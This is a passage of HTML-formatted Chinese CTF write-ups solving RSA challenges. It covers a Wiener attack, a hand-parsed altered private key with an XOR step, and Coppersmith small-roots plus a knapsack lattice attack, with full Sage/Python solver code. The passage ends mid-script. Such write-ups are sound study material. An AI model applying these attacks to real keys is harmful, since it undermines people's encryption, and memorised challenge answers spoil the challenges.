number\">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token number\">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token operator\">=</span>wiener_attack<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"xor贯穿始终\"><a class=\"markdownIt-Anchor\" href=\"#xor贯穿始终\">#</a> XOR 贯穿始终</h3>\n<p>给了一串社会主义核心价值观编码，解密得到压缩包的 key： <code>C0ngr4tulati0n5_y0u_fou^d_m3</code> ，解开压缩包，给了 pri.pem，用 python 代码或 openssl 去解析都会报错，猜测是修改了格式，于是参考<span class=\"exturl\" data-url=\"aHR0cDovL3Quem91a2Fua2FuLmNvbS9qdWthbi1wLTU1Mjc5MjIuaHRtbA==\"> OPENSSL 中 RSA 私钥文件格式</span>进行对照，发现他加了一些东西，也找不到 d 的标志位，但是大部分信息还是在的，只需要找到 n，p，e 解密即可。解出来是乱码，根据题意用压缩包密码异或一下即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>strxor <span class=\"token keyword\">import</span> strxor</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pri <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Gz3++w=='''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>origin <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>hexlify<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>pri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>origin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0x00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x010001</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">0x00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">assert</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>m <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>strxor<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'C0ngr4tulati0n5_y0u_fou^d_m3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"mceorpkpleer\"><a class=\"markdownIt-Anchor\" href=\"#mceorpkpleer\">#</a> MCeorpkpleer</h3>\n<p>看到 p 没给全，先已知高位打一下，同时尝试一下经典背包格，发现密度问题打不了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ph_ <span class=\"token operator\">=</span> <span class=\"token number\">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ph <span class=\"token operator\">=</span> ph_ <span class=\"token operator\">>></span> <span class=\"token number\">435</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pubkey <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>en_e <span class=\"token operator\">=</span> <span class=\"token number\">31087054322877663244023458448558</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pbits<span class=\"token operator\">=</span><span class=\"token number\">1024</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ph<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits<span class=\"token operator\">=</span>pbits <span class=\"token operator\">-</span> ph<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ph <span class=\"token operator\">=</span> ph <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>f <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> ph</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>kbits<span class=\"token punctuation\">,</span>beta<span class=\"token operator\">=</span><span class=\"token number\">0.40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">=</span> ph_ <span class=\"token operator\">+</span> <span class=\"token number\">22279478575805637289061098350801418725939755105414714905065078232409620860952900304322034404385073099026861643396875749287858710167</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">assert</span> p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ph_ <span class=\"token operator\">=</span> <span class=\"token number\">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ph <span class=\"token operator\">=</span> ph_ <span class=\"token operator\">>></span> <span class=\"token number\">435</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pubkey <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">18143710780782459577</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54431132342347378731</span><span class=\"token punctuation\">,</span> <span class=\"token number\">163293397027042136193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">489880191081126408579</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1469640573243379225737</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4408921719730137677211</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13226765159190413031633</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39680295477571239094899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119040886432713717284697</span><span class=\"token punctuation\">,</span> <span class=\"token number\">357122659298141151854091</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1071367977894423455562273</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3214103933683270366686819</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9642311801049811100060457</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28926935403149433300181371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86780806209448299900544113</span><span class=\"token punctuation\">,</span> <span class=\"token number\">260342418628344899701632339</span><span class=\"token punctuation\">,</span> <span class=\"token number\">781027255885034699104897017</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2343081767655104097314691051</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7029245302965312291944073153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21087735908895936875832219459</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63263207726687810627496658377</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189789623180063431882489975131</span><span class=\"token punctuation\">,</span> <span class=\"token number\">569368869540190295647469925393</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1708106608620570886942409776179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">601827224419797931380408071500</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1805481673259393794141224214500</span><span class=\"token punctuation\">,</span> <span class=\"token number\">893952418336266652976851386463</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2681857255008799958930554159389</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3523079163584485147344841221130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1524252287869625983140881149316</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50264262166963219975822190911</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150792786500889659927466572733</span><span class=\"token punctuation\">,</span> <span class=\"token number\">452378359502668979782399718199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1357135078508006939347199154597</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4071405235524020818041597463791</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3169230503688232995231149877299</span><span class=\"token punctuation\">,</span> <span class=\"token number\">462706308180869526799807117823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1388118924542608580399421353469</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4164356773627825741198264060407</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3448085117999647764701149667147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1299270151115113835209806487367</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3897810453345341505629419462101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2648446157152195057994615872229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3422845870014670444537026359650</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1223552407160181874717436564876</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3670657221480545624152309694628</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1966986461557807413563286569810</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1378466783231507511243038452393</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4135400349694522533729115357179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3361215846199738142293703557463</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1038662335715384967987468158315</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3115987007146154903962404474945</span><span class=\"token punctuation\">,</span> <span class=\"token number\">302975818554635252993570910761</span><span class=\"token punctuation\">,</span> <span class=\"token number\">908927455663905758980712732283</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2726782366991717276942138196849</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3657854499533237101379593333510</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1928578295715881845245137486456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1263242285705730806288591202331</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3789726857117192418865773606993</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2324195368467747797703678306905</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2450093503961328663664213663678</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2827787910442071261545819733997</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3960871129884299055190637944954</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2837628186769067706678271320788</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>en_e <span class=\"token operator\">=</span> <span class=\"token number\">31087054322877663244023458448558</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>pbits<span class=\"token operator\">=</span><span class=\"token number\">1024</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ph<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>kbits<span class=\"token operator\">=</span>pbits <span class=\"token operator\">-</span> ph<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>ph <span class=\"token operator\">=</span> ph <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>f <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> ph</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>kbits<span class=\"token punctuation\">,</span>beta<span class=\"token operator\">=</span><span class=\"token number\">0.40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p <span class=\"token operator\">=</span> ph_ <span class=\"token operator\">+</span> <span class=\"token number\">22279478575805637289061098350801418725939755105414714905065078232409620860952900304322034404385073099026861643396875749287858710167</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">assert</span> p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># 接下来用背包格也可以打，比赛时写错一个地方。</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>N <span class=\"token operator\">=</span> ceil<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> sqrt<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>l <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>A <span class=\"token operator\">=</span> Matrix<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">,</span> l<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> l<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span>l<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pubkey<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    A<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>A<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">,</span>l<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> en_e</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>k <span class=\"token operator\">=</span> A<span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> k<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># refer：https://github.com/jvdsn/crypto-attacks/blob/master/attacks/knapsack/low_density.py</span></pre></td></tr></table></figure><p>然后发现私钥 w 已经给了，m 未知但可以通过 gcd 求，最后写一个背包解密函数即可还原 e，然后解 rsa。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179677630589032444985150800881889090713797496239571291907818169058929859395965304623825442220206712660451198754072531986630133689525911</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pubkey <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>en_e <span class=\"token operator\">=</span> <span class=\"token number\">31087054322877663244023458448558</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">assert</span> p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>w <span class=\"token operator\">=</span> <span class=\"token number\">18143710780782459577</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>t1 <span class=\"token operator\">=</span>  w <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">**</span> <span class=\"token number\">63</span> <span class=\"token operator\">-</span> <span class=\"token number\">2837628186769067706678271320788</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>t2 <span class=\"token operator\">=</span> w <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">**</span> <span class=\"token number\">62</span> <span class=\"token operator\">-</span> <span class=\"token number\">3960871129884299055190637944954</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>m <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">,</span>t2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s <span class=\"token operator\">=</span> en_e <span class=\"token operator\">*</span> invert<span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span 